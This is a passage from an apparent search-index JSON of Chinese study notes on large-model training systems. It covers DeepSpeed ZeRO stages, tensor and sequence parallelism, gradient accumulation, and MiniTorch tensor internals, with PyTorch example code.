<p>\u5e76\u4e14DP\u80fd\u591f\u6210\u7acb\u7684\u524d\u63d0\uff0c\u4e5f\u662f\u81f3\u5c11\u4e00\u4e2a\u524d\u5411\u8fc7\u7a0b\u80fd\u591f\u585e\u5165\u5355\u4e2aGPU\u5185\uff0c\u8fd9\u5bf9\u4e8e\u8d85\u5927\u6a21\u578b\u6765\u8bf4\u662f\u65e0\u6cd5\u505a\u5230\u7684</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#3-deepspeed-zero","title":"3. Deepspeed Zero","text":"<p>DeepSpeed\u5185\u90e8\u7684zero\u673a\u5236\uff0c\u662f\u4e00\u79cd\u65e8\u5728\u51cf\u5c11LLM\u8bad\u7ec3\u4e2d\u5185\u5b58\u5197\u4f59\u7684\u4f18\u5316\u6280\u672f</p> <p>DP\u4e2d\u5bf9\u4e8e\u4f18\u5316\u5668\u72b6\u6001\uff0c\u68af\u5ea6\u4ee5\u53ca\u53c2\u6570\u7684\u7b80\u5355\u590d\u5236\u5e26\u6765\u7684\u5197\u4f59\uff08\u6fc0\u6d3b\u503c\u662f\u6bcf\u4e2aDP\u526f\u672c\u4e0d\u540c\u7684\uff0c\u56e0\u6b64\u4e0d\u7b97\u5728\u5197\u4f59\u4e4b\u5185\uff0c\u6211\u4eec\u53ea\u80fd\u901a\u8fc7\u51cf\u5c0fbatch size\u6765\u51cf\u5c0f\u6fc0\u6d3b\u503c\uff09\uff0c\u6b63\u662f\u6211\u4eec\u60f3\u8981\u4f18\u5316\u7684\u76ee\u6807</p> <ul> <li>Zero1 \u4f18\u5316\u5668\u72b6\u6001\u5206\u533a</li> <li>Zero2 \u4f18\u5316\u5668\u72b6\u6001+\u68af\u5ea6\u5206\u533a</li> <li>Zero3 \u4f18\u5316\u5668\u72b6\u6001+\u68af\u5ea6+\u53c2\u6570\u5206\u533a</li> </ul> <p></p> <p>Zero\u7684\u8bbe\u8ba1\u7406\u5ff5\u5728\u4e8e\u628a\u6240\u6709\u590d\u5236\u7684\u6570\u636e\u90fd\u5206\u7247\uff0c\u53ea\u6709\u5728\u5fc5\u8981\u7684\u65f6\u5019\u624d\u805a\u5408\u8d77\u6765\u4f7f\u7528</p> <p>Zero1</p> <p>\u5728Zero1\u4e2d\uff0c\u4f18\u5316\u5668\u72b6\u6001\u88ab\u5206\u4e3aN\u4efd\uff0c\u6bcf\u4e2aGPU\u4e0a\u90fd\u53ea\u7ef4\u62a41/N\u4efd\u4f18\u5316\u5668\u72b6\u6001\uff0c\u66f4\u65b0\u7684\u65f6\u5019\u53ea\u4f18\u5316\u5bf9\u5e94\u7684FP32\u6743\u91cd\uff0c\u800c\u5728\u90e8\u5206\u66f4\u65b0\u5b8c\u6210\u4e4b\u540e\uff0c\u901a\u8fc7\u4e00\u4e2aall-gather\u64cd\u4f5c\uff0c\u5c06\u5404\u4e2aGPU\u4e0a\u7684\u53c2\u6570\u90fd\u66f4\u65b0\u5230\u6700\u65b0\u72b6\u6001</p> <p></p> <p>zero1\u7684\u8fc7\u7a0b\u5982\u4e0a\uff0c\u5728\u68af\u5ea6\u89c4\u7ea6\u7684\u65f6\u5019\uff0c\u4e0d\u518d\u505aAll Reduce\uff0c\u800c\u662f\u505aReduce Scatter\uff0c\u53ea\u5728\u6bcf\u4e2aGPU\u4e0a\u8ba1\u7b97\u5c5e\u4e8e\u81ea\u5df1\u7684\u90a3\u4efd\u7d2f\u79ef\u68af\u5ea6\uff0c\u800c\u5728\u6700\u540e\u6743\u91cd\u66f4\u65b0\u7684\u65f6\u5019\uff0c\u6bcf\u4e2aGPU\u53ea\u66f4\u65b0\u81ea\u5df1\u9700\u8981\u66f4\u65b0\u7684\u6743\u91cd\uff0c\u7136\u540e\u628a\u81ea\u5df1\u66f4\u65b0\u597d\u7684\u6743\u91cd\u540c\u6b65\u7ed9\u5176\u4ed6GPU</p> <p>\u5e76\u4e14\u7ecf\u8fc7\u8ba1\u7b97\uff0c\u6574\u4e2aZero1\u8fc7\u7a0b\u7684\u901a\u4fe1\u548c\u4f20\u7edfDP\u5b8c\u5168\u4e00\u81f4\uff0c\u53ef\u4ee5\u7b97\u5f97\u4e0a\u662fFree lunch</p> <p></p> <p>Zero2</p> <p>\u8fd9\u662fZero2\u7684\u793a\u610f\u56fe\uff0cZero2\u8fdb\u884c\u7684\u662f\u68af\u5ea6\u5206\u7247\uff0c\u672c\u8eab\u5728\u66f4\u65b0\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5728\u6bcf\u4e2a\u526f\u672c\u4e0a\u5c31\u53ea\u9700\u8981\u8be5\u4f18\u5316\u5668\u72b6\u6001\u5206\u7247\u5bf9\u5e94\u7684\u68af\u5ea6\u5206\u7247</p> <p></p> <p>Zero2\u7684\u901a\u4fe1\u538b\u529b\u548cDP\u4e5f\u662f\u7b49\u4ef7\u7684</p> <p>Zero3</p> <p>DeepSpeed \u4e2d\u7684Zero3\u548cPytorch\u4e2d\u7684FSDP\u662f\u7b49\u4ef7\u7684\uff0c\u5b83\u5c06\u5bf9\u4e8e\u68af\u5ea6\u548c\u4f18\u5316\u5668\u72b6\u6001\u7684\u64cd\u4f5c\u590d\u523b\u5230\u4e86\u53c2\u6570\u4e0a\uff0c\u6211\u4eec\u5728\u9700\u8981\u53c2\u6570\u7684\u65f6\u5019\u5c31\u6536\u96c6\u5b83\uff0c\u56e0\u4e3a\u6211\u4eec\u4f1a\u5c06\u4e00\u5c42\u53c2\u6570\u62c6\u5206\u5230\u4e0d\u540c\u5730\u65b9\uff0c\u56e0\u6b64\u8fdb\u884cZero3\u7684\u65f6\u5019\u9700\u8981\u7ecf\u5e38gather</p> <p></p> <p>\u5f88\u663e\u7136\u7684\uff0cZero3\u76f8\u6bd4\u4e8eZero12\uff0c\u589e\u52a0\u4e86\u76f8\u5f53\u4e00\u7b14\u901a\u4fe1\u5f00\u9500\uff0c\u8fd9\u4e2a\u5f00\u9500\u548c\u6a21\u578b\u7684\u5c42\u6570\u6b63\u76f8\u5173</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#4-tensor-parallelism","title":"4. Tensor Parallelism","text":"<p>Zero123 + DP \u6548\u679c\u975e\u5e38\u7406\u60f3\uff0c\u4f46\u662f\u5176\u65e0\u6cd5\u5bf9\u4e8eActivation\u8fdb\u884c\u5206\u7247\uff0c\u56e0\u4e3a\u6fc0\u6d3b\u503c\u7684\u8ba1\u7b97\u662f\u548c\u6570\u636e\u76f8\u5173\u7684\uff0c\u56e0\u6b64\u4e0d\u5b58\u5728\u91cd\u590d\uff0c\u4e5f\u6ca1\u6709\u6d88\u9664\u5197\u4f59\u7684\u7a7a\u95f4\u53ef\u8a00</p> <p></p> <p>\u5728\u5f00\u542fZero3\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4ecd\u7136\u4f1a\u56e0\u4e3a\u6fc0\u6d3b\u503c\u7684\u539f\u56e0\uff0c\u8fbe\u5230\u5355\u4e2a\u786c\u4ef6\u7684\u5185\u5b58\u4e0a\u9650</p> <p>Zero123\u672c\u8d28\u4e0a\u8fd8\u662f\u6570\u636e\u5e76\u884c\uff0c\u867d\u7136\u5bf9\u4e8e\u6bcf\u4e00\u5c42\u8fdb\u884c\u4e86\u5206\u7247\uff0c\u4f46\u662f\u8ba1\u7b97\u7684\u65f6\u5019\u8fd8\u662f\u4f1a\u805a\u96c6\u5230\u540c\u4e00\u4e2aGPU\u91cd\u7ec4\u8fdb\u884c\u8ba1\u7b97\uff0c\u6b64\u65f6\u7b97\u51fa\u6765\u7684\uff0c\u8fd8\u662f\u5b8c\u6574\u7684\u4e00\u5c42\u7684\u6fc0\u6d3b\u503c</p> <p>\u8fd9\u4e2a\u65f6\u5019\u5c31\u662f\u8981\u63d0\u51fa\u6211\u4eec\u7684TP\u4e86\uff0c\u5f20\u91cf\u5e76\u884c\uff0c\u5f20\u91cf\u5e76\u884c\u7684\u539f\u7406\u6765\u81ea\u4e8e\u77e9\u9635\u4e58\u6cd5\u7684\u6027\u8d28\uff0c\u56e0\u4e3aLLM\u8ba1\u7b97\u4e2d\u5927\u90e8\u5206\u64cd\u4f5c\u5747\u4e3a\u77e9\u9635\u4e58\u6cd5\uff0c\u5bf9\u4e8e\u77e9\u9635\uff0c\u6211\u4eec\u7684\u64cd\u4f5c\u4e3b\u8981\u662f\u5bf9\u4e8e\u77e9\u9635\u5217\u548c\u884c\u8fdb\u884c\u72ec\u7acb\u7684\u64cd\u4f5c\uff0c\u56e0\u6b64\u5982\u679c\u5bf9\u4e8e\u884c\u548c\u5217\u8fdb\u884c\u5206\u5272\uff0c\u5c31\u53ef\u4ee5\u987a\u5229\u5b8c\u6210\u77e9\u9635\u4e58\u6cd5</p> <p></p> <p>\u6bd4\u5982\u5217\u5206\u5272 column-wise</p> <p></p> <p>[!code]- ColumnParallelLinear \u5b9e\u73b0\u8be6\u60c5 <pre><code>class ColumnParallelLinear(torch.nn.Module):\n    \"\"\"Column Parallel Linear layer\n    Y = XW + b, where weight matrix W is parallelized along its second dimension. W = [W_1, ..., W_p]\n    This module returns the results of Y_i = XW_i + b_i in the forward method, Y_i is parallelized in the second dimension.\n    Arguments:\n        in_features: first dimension of weight matrix W.\n        out_features: second dimension of weight matrix W.\n        bias: If true, add bias\n        init_method: method to initialize weights\n        gather_output: If true, gather the output from all the partitions. This is used for the last linear layer\n    \"\"\"\n\n    def __init__(\n        self,\n        in_features: int,\n        out_features: int,\n        bias: bool = False,\n        gather_output: bool = False,\n        async_all_reduce: bool = False,\n    ) -&gt; None:\n        super(ColumnParallelLinear, self).__init__()\n\n        self.tp_world_size = pgm.process_group_manager.tp_world_size\n        self.tp_rank = pgm.process_group_manager.tp_rank \n\n        self.in_features = in_features\n        self.out_features = out_features\n        assert out_features % self.tp_world_size == 0, \"Hidden dimension must be divisible by the tensor parallel world size\"\n        self.output_size_per_partition = out_features // self.tp_world_size\n        self.gather_output = gather_output\n        self.async_all_reduce = async_all_reduce\n        # Allocate space for the weight and bias\n        # Note: torch.nn.functional.linear performs XW^T + b so we exchange the order of dimensions\n        self.weight = nn.Parameter(torch.Tensor(self.output_size_per_partition, self.in_features)) # W_i\n        if bias:\n            self.bias = nn.Parameter(torch.Tensor(self.output_size_per_partition))\n            with torch.no_grad():\n                self.bias.zero_()\n        else:\n            self.register_parameter(\"bias\", None)\n\n        self.reset_parameters()\n\n    def reset_parameters(self):\n        # Initialize weight tensor with the default initialization method used for nn.Linear in PyTorch\n        master_weight = torch.empty(\n            self.out_features, \n            self.in_features, \n            dtype=self.weight.dtype,\n            device=self.weight.device,\n            requires_grad=False\n        )\n        \n        # Calculate bound based on master weight's input dimension\n        k = 1 / master_weight.size(1)\n        bound = math.sqrt(k)\n        torch.nn.init.uniform_(master_weight, -bound, bound)\n        \n        # Split the model into size of self.output_size_per_partition\n        weight_list = torch.split(master_weight, self.output_size_per_partition, dim=0)\n        self.weight.data = weight_list[self.tp_rank].contiguous()\n    \n    def forward(self, x: torch.Tensor) -&gt; torch.Tensor:  \n        if self.async_all_reduce:\n            output = linear_with_async_all_reduce(x, self.weight, self.bias) \n        else:\n            output = linear_with_all_reduce(x, self.weight, self.bias) \n        if self.gather_output:\n            output = GatherFromModelParallelRegion.apply(output)\n        return output\n</code></pre></p> <p>\u4ee5\u4e0b\u8fd8\u6709\u884c\u7ea7\u7684\u5f20\u91cf\u5e76\u884c\u7684\u793a\u610f\u56fe</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#41-transformer-tp","title":"4.1. Transformer \u4e2d\u7684 TP","text":"<p>\u6700\u81ea\u7136\u7684\u65b9\u6848\u5c31\u662f\u540c\u65f6\u8fdb\u884c\u884c\u5206\u5272\u548c\u5217\u5206\u5272\uff0c\u5904\u7406Transformer\u4e2d\u7684FFN\u7684\u65f6\u5019\u6211\u4eec\u5c31\u8fd9\u4e48\u505a</p> <p></p> <p>\u5bf9\u4e8e\u53e6\u4e00\u90e8\u5206\uff0c\u5c31\u662f\u591a\u5934\u6ce8\u610f\u529b\u673a\u5236\u8fd9\u4e00\u90e8\u5206</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u6ce8\u610f\u529b\u5934\u8fdb\u884c\u5212\u5206\uff0c\u5217\u5e76\u884c\u548c\u8fd9\u4e2a\u65b9\u6848\u662f\u5b8c\u5168\u7684\u5339\u914d\u7684\uff0c\u8fd9\u4e5f\u662f\u56e0\u4e3aAttention\u8ba1\u7b97\u4e2d\uff0c\u6bcf\u4e2ahead\u4e4b\u95f4\u662f\u72ec\u7acb\u7684\uff0c\u7c7b\u4f3c\u7684\uff0c\u5bf9\u4e8eFFN\u8ba1\u7b97\u4e2d</p> <p>\u56e0\u6b64TP\u7684\u5e76\u884c\u5f80\u5f80\u4e0d\u80fd\u8d85\u8fc7Attention head\u6570\u91cf\uff0c\u5728\u5b9e\u9645\u73af\u5883\u4e2d\u6211\u4eec\u5f80\u5f80\u4f1a\u4f7f\u7528PD\u5206\u79bb\uff0cPrefill\u8fd9\u4e00\u5757\u5f80\u5f80\u4f1a\u7528\u5230\u5927\u91cf\u7684TP\u6765\u69a8\u5e72\u7b97\u529b\uff0c\u800cDecoder\u8fd9\u4e00\u5757\u5f80\u5f80\u4ee5\u4f7f\u7528Pipeline Parallelism\u548c\u5c11\u91cfTP</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#42-sequence-parallelism","title":"4.2. Sequence Parallelism","text":"<p>TP\u662f\u5b58\u5728Trade Off\u7684\uff0c\u56e0\u4e3a\u5176\u5f15\u5165\u4e86\u901a\u4fe1\u5f00\u9500\uff0c\u5e76\u4e14\u6ca1\u6709\u50cfZeRO\u90a3\u6837\u5c06\u5176\u4e0e\u8ba1\u7b97\u51b2\u5f97</p> <p></p> <p>\u800cSequnce Parallelism\u548cTP\u662f\u9002\u914d\u5b58\u5728\u7684\uff0c\u5176\u7528\u4e8e\u5e94\u5bf9TP\u4e2d\u7684\u4f8b\u5982DropOut\u548cLayer Norm\u7684\u90e8\u5206</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#appendix-code-practice","title":"Appendix: code practice","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#1-show-gpt2-architecture","title":"1. Show GPT2 Architecture","text":"<pre><code>from transformers import GPT2Model\nmodel = GPT2Model.from_pretrained('gpt2')\ndef count_params(model):\n    params: int = sum(p.numel() for p in model.parameters())\n    return f\"{params / 1e6:.2f}M\"\n\nprint(model)\nprint(\"Total # of params:\", count_params(model))\n</code></pre> <p>\u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0b</p> <pre><code>GPT2Model(\n  (wte): Embedding(50257, 768) # token embedding, from one-hot vector to 768-dimensional vector\n  (wpe): Embedding(1024, 768)  # position embedding \u652f\u6301\u6700\u59271024\u5e8f\u5217\u957f\u5ea6\n  (drop): Dropout(p=0.1, inplace=False)\n  (h): ModuleList(\n    (0-11): 12 x GPT2Block(\n      (ln_1): LayerNorm((768,), eps=1e-05, elementwise_affine=True)\n      (attn): GPT2Attention(\n        (c_attn): Conv1D(nf=2304, nx=768)\n        (c_proj): Conv1D(nf=768, nx=768)\n        (attn_dropout): Dropout(p=0.1, inplace=False)\n        (resid_dropout): Dropout(p=0.1, inplace=False)\n      )\n      (ln_2): LayerNorm((768,), eps=1e-05, elementwise_affine=True)\n      (mlp): GPT2MLP(\n        (c_fc): Conv1D(nf=3072, nx=768)\n        (c_proj): Conv1D(nf=768, nx=3072)\n        (act): NewGELUActivation()\n        (dropout): Dropout(p=0.1, inplace=False)\n      )\n    )\n  )\n  (ln_f): LayerNorm((768,), eps=1e-05, elementwise_affine=True)\n)\nTotal # of params: 124.44M\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#2-memory-compute","title":"2. Memory Compute","text":"<p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7checkpoint\u8fd9\u4e2a\u673a\u5236\uff0c\u6765\u5b9e\u73b0\u6fc0\u6d3b\u503c\u91cd\u8ba1\u7b97</p> <p>\u8fd9\u4e2a\u5728\u5c0f\u6a21\u578b\u4e2d\u5f88\u96be\u4f53\u73b0\u8fd9\u4e00\u70b9</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#3-gradient-accumulation","title":"3. Gradient Accumulation","text":"<pre><code>import torch\nfrom torch import nn, optim\n\nmodel = nn.Linear(10, 1).cuda()\noptimizer = optim.SGD(model.parameters(), lr=0.01)\nloss_fn = nn.MSELoss()\n\ngradient_accumulation_steps = 4\nmicrobatch_size = 2\n\n# Fake data\ninputs = torch.randn(gradient_accumulation_steps * microbatch_size, 10).cuda()\ntargets = torch.randn(gradient_accumulation_steps * microbatch_size, 1).cuda()\n\nmodel.train()            # \u5207\u6362\u5230\u8bad\u7ec3\u6a21\u578b\noptimizer.zero_grad()    # \u6e05\u7a7a\u4e4b\u524d\u7684\u68af\u5ea6\uff0c\u4e60\u60ef\u6027\u64cd\u4f5c\u5728\u8bad\u7ec3\u4e4b\u524d\nfor i in range(gradient_accumulation_steps):\n    start = i * microbatch_size\n    end = (i + 1) * microbatch_size\n    x = inputs[start:end]\n    y = targets[start:end]\n\n    output = model(x)\n    loss = loss_fn(output, y)\n    loss.backward()  # \u53ea\u7b97\u68af\u5ea6\uff0c\u800c\u4e0d\u66f4\u65b0\n\n    print(f\"Step {i+1}: Loss = {loss.item():.4f}\")\n\noptimizer.step()   # \u66f4\u65b0\u68af\u5ea6\uff0c\u6b64\u65f6param.grad\u4e2d\u5df2\u7ecf\u4fdd\u5b58\u4e864\u4e2aminibatch\u7684\u68af\u5ea6\u4e86\nprint(\"Optimizer step performed with accumulated gradients.\")\n</code></pre> <p>\u4e0a\u8ff0\u662f\u4e00\u4e2a\u68af\u5ea6\u7d2f\u79ef\u7684\u6a21\u62df\uff0c\u6211\u4eec\u5728\u4e00\u4e2a\u5faa\u73af\u4e2d\u53ea\u8ba1\u7b97\u68af\u5ea6\uff0c\u800c\u4e0d\u66f4\u65b0\uff0c\u5728\u5faa\u73af\u7ed3\u675f\u4e4b\u540e\u7d2f\u79ef\u68af\u5ea6\u518d\u66f4\u65b0</p> <p>\u771f\u6b63\u5b9e\u8df5\u4e2d\uff0c\u8be5\u65b9\u6848\u5185\u5316\u6210\u4e86\u5982\u4e0b\u7684\u53c2\u6570</p> <pre><code>from transformers import Trainer\n\ntraining_args = TrainingArguments(\n    per_device_train_batch_size=2,      # micro-batch\n    gradient_accumulation_steps=4,     # \u7d2f\u79ef 4 \u6b21\n    # \u5b9e\u9645\u7b49\u4ef7\u4e8e global batch size = 2 \u00d7 4 \u00d7 (GPU\u6570\u91cf)\n    # \u6bd4\u5982 8 \u5f20\u5361\uff1a2 \u00d7 4 \u00d7 8 = 64\n)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#4-data-paraellism","title":"4. Data Paraellism","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/","title":"MiniTorch","text":"<p>\u8fd9\u662fLLM System\u8bfe\u7a0b\u7684\u5927\u4f5c\u4e1a\uff0c\u8fd9\u8bfe\u7a0b\u6ca1\u6709\u5f00\u6e90\u89c6\u9891\u8d44\u6e90\uff0c\u4f46\u662f\u5f00\u6e90\u5b83\u7684\u5927\u4f5c\u4e1a\u6846\u67b6\uff0c\u5199\u8fd9\u4e2a\u5927\u4f5c\u4e1a\uff0c\u5927\u6982\u9700\u8981\u4e24\u5468\u7684\u65f6\u95f4</p> <p>\u5b9e\u73b0\u7684\u4ee3\u7801\u540e\u7eed\u4f1a\u653e\u5230\u4e00\u4e2agithub\u94fe\u63a5\u4e2d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#1","title":"1. \u6846\u67b6\u4ecb\u7ecd","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#11-tensor","title":"1.1. Tensor","text":"<p>1.1. Tensor data</p> <p>\u8fd9\u90e8\u5206\u662ftensor\u5b9e\u9645\u7684\u5b58\u50a8\u7ed3\u6784\uff0c\u4e5f\u662f\u6700\u5e95\u5c42\u7684\u5b58\u50a8\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u6240\u6709\u7684\u5e95\u5c42\u5b58\u50a8\u90fd\u662f\u4e00\u7ef4\u6570\u7ec4\uff0ctensor data\u8986\u76d6\u4e86\u4e00\u7ef4\u6570\u7ec4\u5230\u4e00\u4e2a\u4efb\u610f\u7ef4\u5ea6\u7684\u77e9\u9635\u7684\u6620\u5c04</p> <pre><code>class TensorData:\n    _storage: Storage\n    _strides: Strides\n    _shape: Shape\n    strides: UserStrides\n    shape: UserShape\n    dims: int\n\n    def __init__(\n        self,\n        storage: Union[Sequence[float], Storage],\n        shape: UserShape,\n        strides: Optional[UserStrides] = None,\n    ):\n        if isinstance(storage, np.ndarray):\n            self._storage = storage.astype(datatype)\n        else:\n            self._storage = array(storage, dtype=datatype)\n\n        if strides is None:\n            strides = strides_from_shape(shape)\n\n        assert isinstance(strides, tuple), \"Strides must be tuple\"\n        assert isinstance(shape, tuple), \"Shape must be tuple\"\n        if len(strides) != len(shape):\n            raise IndexingError(f\"Len of strides {strides} must match {shape}.\")\n        self._strides = array(strides)\n        self._shape = array(shape)\n        self.strides = strides\n        self.dims = len(strides)\n        self.size = int(prod(shape))\n        self.shape = shape\n        assert len(self._storage) == self.size\n</code></pre> <p>\u5176\u4e2d\u9700\u8981\u6ce8\u610fshape\u548cstrides\u8fd9\u4e24\u4e2a\u6982\u5ff5\uff0cshape\u662f\u66b4\u9732\u5728\u7528\u6237\u7aef\u7684\uff0c\u4e5f\u5373\u8fd9\u4e2atensor\u7684\u5f62\u72b6\uff0c\u4f8b\u5982<code>[3, 4]</code>\u8fd9\u6837\u5b50\u7684\u5f20\u91cf</p> <p>\u800cstrides\u662f\u548cshape\u76f8\u8f85\u76f8\u6210\u7684\u6982\u5ff5\uff0c\u5176\u5bf9\u5e94\u7740shape\uff0c\u544a\u8bc9\u5e95\u5c42\u8bbf\u95ee\u4e00\u7ef4\u6570\u7ec4\u7684\u65f6\u5019\uff0c\u4f60\u8981\u8df3\u8fc7\u591a\u5c11\u4e2a\u5143\u7d20\uff0c\u6700\u7ecf\u5178\u7684\u4f7f\u7528\u5982\u4e0b\uff0c\u5f53\u6211\u4eec\u8981\u8bbf\u95ee\u67d0\u4e2a\u5177\u4f53\u7684\u5143\u7d20\u7684index\u65f6\u5019\uff0c\u8981\u901a\u8fc7\u8fd9\u4e2astrides\u6765\u5177\u4f53\u8bbf\u95ee\u5230\u54ea\u4e2a\u5143\u7d20\uff0cindex\u662f\u77e9\u9635\u7684\u89c6\u89d2\uff0cposition\u662f\u5e95\u5c42\u5b58\u50a8\u7684\u89c6\u89d2</p> <pre><code>def index_to_position(index: Index, strides: Strides) -&gt; int:\n    \"\"\"\n    Converts a multidimensional tensor `index` into a single-dimensional position in\n    storage based on strides.\n\n    Args:\n        index : index tuple of ints\n        strides : tensor strides\n\n    Returns:\n        Position in storage\n    \"\"\"\n\n    position = 0\n    for ind, stride in zip(index, strides):\n        position += ind * stride\n    return position\n</code></pre> <p>\u4e0a\u8ff0\u90fd\u662f\u6982\u5ff5\u4e0a\u7684python\u5b9e\u73b0\uff0c\u5b9e\u9645\u4e0a\u7684pytorch\u4e2d\uff0c\u8fd9\u4e9b\u90fd\u5e94\u8be5\u5728cuda\u4e0a\u5b9e\u73b0</p> <p>1.2. Tensor ops</p> <pre><code>class TensorOps:\n    @staticmethod\n    def map(fn: Callable[[float], float]) -&gt; MapProto:\n        pass\n\n    @staticmethod\n    def cmap(fn: Callable[[float], float]) -&gt; Callable[[Tensor, Tensor], Tensor]:\n        pass\n\n    @staticmethod\n    def zip(fn: Callable[[float, float], float]) -&gt; Callable[[Tensor, Tensor], Tensor]:\n        pass\n\n    @staticmethod\n    def reduce(\n        fn: Callable[[float, float], float], start: float = 0.0\n    ) -&gt; Callable[[Tensor, int], Tensor]:\n        pass\n\n    @staticmethod\n    def matrix_multiply(a: Tensor, b: Tensor) -&gt; Tensor:\n        raise NotImplementedError(\"Not implemented in this assignment\")\n\n    cuda = False\n</code></pre> <p>\u5b9a\u4e49\u4e86\u57fa\u7840\u7684tensor\u64cd\u4f5c</p> <ul> <li>map \u4e00\u5143\u64cd\u4f5c\uff0c\u4f8b\u5982exp(x)\uff0c\u5bf9\u4e8ex\u4e2d\u7684\u6240\u6709\u5143\u7d20\u8fdb\u884c\u4e00\u4e2aexp</li> <li>zip \u4e8c\u5143\u64cd\u4f5c\uff0c\u4f8b\u5982x+y</li> <li>reduce \u89c4\u7ea6\u64cd\u4f5c\uff0c\u4f8b\u5982sum(x)\uff0c\u5c06\u6240\u6709\u7684\u5143\u7d20\u4ee5\u67d0\u79cd\u5f62\u5f0f\u8fdb\u884c\u5904\u7406</li> <li>\u77e9\u9635\u4e58\u6cd5\uff1a\u7279\u6b8a\u7684\u4f18\u5316\u64cd\u4f5c</li> </ul> <p>\u7c7b\u4f3c\u7684\u5b9e\u73b0\u4e86\u4e00\u4e2aSimpleOps\u7684\u7c7b\uff0c\u662f\u7528python\u8fdb\u884c\u903b\u8f91\u4e0a\u7684\u5b9e\u73b0</p> <pre><code>class SimpleOps(TensorOps):\n    @staticmethod\n    def map(fn: Callable[[float], float]) -&gt; MapProto:\n        \"\"\"\n        Higher-order tensor map function ::\n\n          fn_map = map(fn)\n          fn_map(a, out)\n          out\n\n        Simple version::\n\n            for i:\n                for j:\n                    out[i, j] = fn(a[i, j])\n\n        Broadcasted version (`a` might be smaller than `out`) ::\n\n            for i:\n                for j:\n                    out[i, j] = fn(a[i, 0])\n\n        Args:\n            fn: function from float-to-float to apply.\n            a (:class:`TensorData`): tensor to map over\n            out (:class:`TensorData`): optional, tensor data to fill in,\n                   should broadcast with `a`\n\n        Returns:\n            new tensor data\n        \"\"\"\n\n        f = tensor_map(fn)\n\n        def ret(a: Tensor, out: Optional[Tensor] = None) -&gt; Tensor:\n            if out is None:\n                out = a.zeros(a.shape)\n            f(*out.tuple(), *a.tuple())\n            return out\n\n        return ret\n</code></pre> <p>\u5b9e\u9645\u4e0a\u6211\u4eec\u5e94\u8be5\u8fdb\u884ccuda\u7248\u672c\u7684\u5b9e\u73b0\uff0c\u7ee7\u627f\u8fd9\u4e2a\u7279\u6b8a\u7c7b\u5373\u53ef</p> <p>1.3. Tensor function</p> <p>\u8fd9\u4e2a\u7c7b\u4e3b\u8981\u5904\u7406\u524d\u5411\u548c\u53cd\u5411\u7684\u90e8\u5206\uff0c\u5728torch\u4e2d\uff0c\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u662f\u9488\u5bf9tensor\uff0c\u8fd9\u5c31\u884d\u751f\u51fa\u4e86\u4e24\u4e2a\u90e8\u5206</p> <ol> <li>\u64cd\u4f5c\u672c\u8eab\uff0c\u4f8b\u5982\u52a0\u51cf\u4e58\u9664\uff0cexp\uff0c\u6c42\u548c\uff0c\u6bd4\u8f83</li> <li>\u64cd\u4f5c\u5230\u77e9\u9635\u7684\u6269\u5f20\uff0c\u4f8b\u5982map\uff0czip\uff0creduce\uff0c\u8fd9\u4e9b\u5185\u5bb9\u88ab\u79f0\u4e3a\u5e76\u884c\u64cd\u4f5c\u539f\u8bed</li> </ol> <p>\u4e0a\u8ff0\u7684Tensor ops\u662f\u9488\u5bf9\u7684\u7b2c2\u90e8\u5206\uff0c\u800c\u8fd9\u4e00\u90e8\u5206\u662f\u5904\u7406\u7684\u7b2c\u4e00\u90e8\u5206\uff0c\u4e5f\u5373\u64cd\u4f5c\u672c\u8eab</p> <pre><code># Constructors\nclass Function:\n    @classmethod\n    def _backward(cls, ctx: Context, grad_out: Tensor) -&gt; Tuple[Tensor, ...]:\n        return wrap_tuple(cls.backward(ctx, grad_out))  # type: ignore\n\n    @classmethod\n    def _forward(cls, ctx: Context, *inps: Tensor) -&gt; Tensor:\n        return cls.forward(ctx, *inps)  # type: ignore\n\n    @classmethod\n    def apply(cls, *vals: Tensor) -&gt; Tensor:\n        raw_vals = []\n        need_grad = False\n        for v in vals:\n            if v.requires_grad():\n                need_grad = True\n            raw_vals.append(v.detach())\n\n        # Create the context.\n        ctx = Context(not need_grad)\n\n        # Call forward with the variables.\n        c = cls._forward(ctx, *raw_vals)\n        # assert isinstance(c, Tensor), \"Expected return type Tensor got %s\" % (\n        #     type(c)\n        # )\n\n        # Create a new variable from the result with a new history.\n        back = None\n        if need_grad:\n     